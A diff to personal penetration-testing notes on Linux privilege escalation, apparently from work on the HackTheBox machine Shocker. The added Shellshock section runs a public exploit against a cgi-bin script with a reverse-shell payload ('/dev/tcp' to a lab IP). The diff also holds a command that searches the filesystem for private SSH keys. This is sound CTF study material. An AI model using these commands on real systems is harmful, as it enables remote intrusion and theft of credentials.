@@ -1,4 +1,14 @@
-# General Info and Approach
+# Remote Priv Esc
+
+## Shell Shock 
+
+* spot /cgi-bin
+* dirbust .sh .cgi or some more exotic script files in it 
+* use 34766.php
+
+`php 34766.php -u http://shocker.htb/cgi-bin/user.sh -c "sh -i >& /dev/tcp/10.10.14.18/443 0>&1" `
+
+# Local Priv Esc: General Info and Approach
 
 * Generally you end up in restricted user account or shell
 * You can almost always write to `/tmp` folder
@@ -54,8 +64,6 @@ find / -name id_rsa 2> /dev/null
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ssh-key-predictable-prng-authorized_keys-process
 
 
-
-# sudo misconfigurations or vulnerabilities
 
 
 # SUID or SGID misconfigurations
